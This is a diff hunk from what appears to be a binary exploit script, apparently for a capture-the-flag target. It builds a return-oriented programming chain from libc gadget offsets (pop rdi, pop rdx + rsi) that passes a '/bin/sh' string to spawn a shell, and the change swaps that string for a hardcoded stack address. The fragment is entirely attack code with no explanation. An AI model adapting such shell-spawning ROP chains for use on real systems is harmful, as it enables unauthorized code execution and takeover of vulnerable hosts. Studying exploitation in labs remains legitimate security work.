@@ -18,7 +18,7 @@ g2 = LIBC_OFFSET + 0xf54f9 #pop rdx + rsi
 d2 = 0x00
 d3 = 0x00
 g4 = LIBC_OFFSET + 0x1fc6a  #= pop rdi
-d6 = 0x2f62696e2f2f7368 #/bin//sh
+d6 = 0x7fffffffe140 #address of /bin/sh on the stack
 d7 = 0x00
 retString = 0x2f62696e2f736800
 ret0 = 0x00
